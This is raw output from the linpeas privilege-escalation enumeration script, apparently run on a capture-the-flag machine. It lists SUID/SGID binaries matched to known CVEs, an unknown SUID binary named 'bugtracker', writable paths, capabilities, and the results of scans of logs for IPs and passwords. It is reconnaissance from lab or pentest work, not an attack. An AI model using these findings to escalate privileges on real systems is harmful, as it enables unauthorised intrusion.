-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                  
-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                    
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                       
-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                          
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             27K Aug 22  2019 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             43K Aug 22  2019 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   
-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                    
-rwsr-xr-x 1 root   root            146K Oct 10  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                                                       
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                         
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                          
-rwsr-xr-- 1 root   bugtracker      8.6K Jan 25  2020 /usr/bin/bugtracker (Unknown SUID binary)
----------------------------------------------------------------------------------------
  --- Trying to execute /usr/bin/bugtracker with strace in order to look for hijackable libraries...
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
----------------------------------------------------------------------------------------


╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
linpeas.sh: line 2797: 6: command not found                                                                         
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7270/usr/bin/mail-unlock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7270/usr/bin/mail-touchlock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 3 root   mail             15K Dec  3  2012 /snap/core/7270/usr/bin/mail-lock
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   mail             15K Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   utmp             10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   systemd-network  36K Apr  5  2016 /snap/core/7270/usr/bin/crontab
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   crontab          39K Nov 16  2017 /usr/bin/crontab
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   tty              14K Jan 17  2018 /usr/bin/bsd-write
linpeas.sh: line 2797: 6: command not found
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   mlocate          43K Mar  1  2018 /usr/bin/mlocate
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           35K Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           34K Feb 27  2019 /sbin/unix_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   ssh             355K Mar  4  2019 /usr/bin/ssh-agent
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   crontab         351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   crontab         351K Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           23K Mar 22  2019 /usr/bin/expiry
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           71K Mar 22  2019 /usr/bin/chage
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/8268/usr/bin/chage
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           23K Mar 25  2019 /snap/core/7270/usr/bin/expiry
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   shadow           61K Mar 25  2019 /snap/core/7270/usr/bin/chage
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   tty              27K May 15  2019 /snap/core/7270/usr/bin/wall
linpeas.sh: line 2797: 6: command not found
-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   tty              31K Aug 22  2019 /usr/bin/wall
linpeas.sh: line 2797: 6: command not found
-rwxr-sr-x 1 root   tty              27K Oct 10  2019 /snap/core/8268/usr/bin/wall
linpeas.sh: line 2797: 6: command not found
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
linpeas.sh: line 2797: 6: command not found
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                 
/etc/ld.so.conf                                                                                                     
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
Current capabilities:                                                                                               
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
                                                                                                                    
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                  
                                                                                                                    
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                               
/usr/bin/gettext.sh                                                                                                 

╔══════════╣ Unexpected in root
/swap.img                                                                                                           
/vmlinuz.old
/vmlinuz
/initrd.img.old
/initrd.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                        
total 36                                                                                                            
drwxr-xr-x  2 root root 4096 Jan 27  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root  825 Jun  5  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 May 11  2019 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 May 11  2019 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                          
                                                                                                                    
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                        
═╣ Credentials in fstab/mtab? ........... No                                                                        
═╣ Can I read shadow files? ............. No                                                                        
═╣ Can I read opasswd file? ............. No                                                                        
═╣ Can I write in network-scripts? ...... No                                                                        
═╣ Can I read root folder? .............. No                                                                        
                                                                                                                    
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                              
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service                                                 
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                    
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/robert/.config/lxc/config.yml                                                                                 
/home/robert/.gnupg/pubring.kbx
/home/robert/.gnupg/crls.d/DIR.txt
/home/robert/.gnupg/trustdb.gpg
/var/log/btmp
/var/log/lastlog
/var/log/vmware-vmsvc-root.log
/var/log/auth.log
/var/log/journal/30ac2a931f55413aac392af212029ea4/system@207431e352024df29c168c357b7698f7-000000000000803c-0005c6930824226b.journal
/var/log/journal/30ac2a931f55413aac392af212029ea4/user-1000.journal
/var/log/journal/30ac2a931f55413aac392af212029ea4/user-1000@4a64ddce09354077a5f41ea8f7d148a7-00000000000007ed-00059ccd5e870096.journal
/var/log/journal/30ac2a931f55413aac392af212029ea4/system.journal
/var/log/syslog
/var/log/wtmp

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                
                                                                                                                    
╔══════════╣ Files inside /home/robert (limit 20)
total 40                                                                                                            
drwxr-xr-x 6 robert robert 4096 Jul  8 07:57 .
drwxr-xr-x 3 root   root   4096 Jan 23  2020 ..
lrwxrwxrwx 1 robert robert    9 Jan 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwx------ 2 robert robert 4096 Jan 23  2020 .cache
drwxr-x--- 3 robert robert 4096 Jul  8 07:57 .config
drwx------ 4 robert robert 4096 Jul  8 07:57 .gnupg
drwxrwxr-x 3 robert robert 4096 Jan 25  2020 .local
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rw-r--r-- 1 robert robert   33 Feb 25  2020 user.txt

╔══════════╣ Files inside others home (limit 20)
                                                                                                                    
╔══════════╣ Searching installed mail applications
                                                                                                                    
╔══════════╣ Mails (limit 50)
                                                                                                                    
╔══════════╣ Backup folders
                                                                                                                    
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old                                           
-rw-r--r-- 1 root root 7857 Dec 18  2019 /lib/modules/4.15.0-74-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Dec 18  2019 /lib/modules/4.15.0-74-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                               
-rw-r--r-- 1 root root 7857 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Jan 17  2020 /lib/modules/4.15.0-76-generic/kernel/drivers/net/team/team_mode_activebackup.ko                                                                                                               
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11755 Jan 27  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2746 Dec  5  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 1513 Oct 20  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 217506 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/net/team/mode/activebackup.h                                                                                                              
-rw-r--r-- 1 root root 217506 Dec 18  2019 /usr/src/linux-headers-4.15.0-74-generic/.config.old
-rw-r--r-- 1 root root 0 Dec 18  2019 /usr/src/linux-headers-4.15.0-74-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Dec 18  2019 /usr/src/linux-headers-4.15.0-74-generic/include/config/net/team/mode/activebackup.h                                                                                                              
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file                           
Found: /snap/core/8268/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                          
total 12K
drwxr-xr-x  3 root root 4.0K Jan 23  2020 .
drwxr-xr-x 14 root root 4.0K Jan 23  2020 ..
drwxr-xr-x  9 root root 4.0K Jan 28  2020 html

/var/www/html:
total 48K
drwxr-xr-x 9 root root 4.0K Jan 28  2020 .
drwxr-xr-x 3 root root 4.0K Jan 23  2020 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Jun 21  2019 /snap/core/7270/etc/.pwd.lock                                                 
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/7270/etc/skel/.bash_logout
-rw------- 1 root root 0 Dec  6  2019 /snap/core/8268/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8268/etc/skel/.bash_logout
-rw-r--r-- 1 robert robert 220 Apr  4  2018 /home/robert/.bash_logout
-rw-r--r-- 1 root root 1531 Jan 23  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 landscape landscape 0 Aug  5  2019 /var/lib/landscape/.cleanup.user
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Jan 23  2020 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 37 Jul  8 02:01 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Jul  8 02:01 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 root root 0 Jul  8 02:01 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                   
-rw-r--r-- 1 root root 204774 Jan 27  2020 /var/backups/dpkg.status.1.gz                                            
-rw-r--r-- 1 root root 202 Aug  5  2019 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 171 Jan 23  2020 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 437 Aug  5  2019 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 43643 Jan 27  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 4642 Jan 25  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 3645 Jan 24  2020 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 207 Jan 23  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 51200 Jan 28  2020 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 734633 Jan 28  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 3507 Jan 23  2020 /var/backups/apt.extended_states.3.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
/dev/mqueue                                                                                                         
/dev/shm
/home/robert
/run/lock
/run/screen
/run/screen/S-robert
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/snap/core/7270/run/lock
/snap/core/7270/tmp
/snap/core/7270/var/tmp
/snap/core/8268/run/lock
/snap/core/8268/tmp
/snap/core/8268/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/swap.img.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vgauth.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/dirmngr.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/gpg-agent.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/snapd.session-agent.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/snapd.session-agent.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/snapd.session-agent.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/snapd.session-agent.service/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/snapd.session-agent.service/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/tasks
/var/lib/php/sessions
/var/tmp
/var/www/html/uploads

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                        
  Group robert:                                                                                                     
                                                                                                                    
  Group bugtracker:
                                                                                                                    

╔══════════╣ Searching passwords in config PHP files
                                                                                                                    
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                    
╔══════════╣ Finding IPs inside logs (limit 70)
    186 0.18.04.1                                                                                                   
    155 0.18.04.2
    103 0.18.04.4
    101 3.18.04.1
     61 3.18.04.2
     42 0.96.24.32
     38 2.18.04.1
     37 0.18.04.5
     30 7.18.04.2
     29 172.16.118.129
     18 3.192.1.7
     17 1.18.04.11
     17 1.18.04.1
     16 18.04.11.10
     15 172.16.118.131
     12 172.16.118.2
     12 1.18.04.13
     11 2.18.04.3
     10 10.10.10.28
     10 10.10.10.2
      8 6.18.04.1
      8 5.18.04.3
      8 0.19.8.1
      7 018.09.18.1
      4 255.255.255.255
      3 91.189.94.4
      3 172.16.118.255
      2 10.10.14.15
      2 0.99.7.1
      1 91.189.89.198
      1 127.255.255.255

╔══════════╣ Finding passwords inside logs (limit 70)
2019-08-05 19:22:58 configure base-passwd:amd64 3.5.44 3.5.44                                                       
2019-08-05 19:22:58 install base-passwd:amd64 <none> 3.5.44
2019-08-05 19:22:58 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status half-installed base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status installed base-passwd:amd64 3.5.44
2019-08-05 19:22:58 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status half-installed base-passwd:amd64 3.5.44
2019-08-05 19:22:59 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:22:59 upgrade base-passwd:amd64 3.5.44 3.5.44
2019-08-05 19:23:02 install passwd:amd64 <none> 1:4.5-1ubuntu1
2019-08-05 19:23:02 status half-installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:02 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:03 configure base-passwd:amd64 3.5.44 <none>
2019-08-05 19:23:03 status half-configured base-passwd:amd64 3.5.44
2019-08-05 19:23:03 status installed base-passwd:amd64 3.5.44
2019-08-05 19:23:03 status unpacked base-passwd:amd64 3.5.44
2019-08-05 19:23:04 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2019-08-05 19:23:04 status half-configured passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:04 status installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:04 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status half-configured passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 status half-installed passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status installed passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu1
2019-08-05 19:23:48 status unpacked passwd:amd64 1:4.5-1ubuntu2
2019-08-05 19:23:48 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-01-23 11:55:39,740 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-01-23 11:55:39,800 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
2020-01-23 11:55:39,800 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
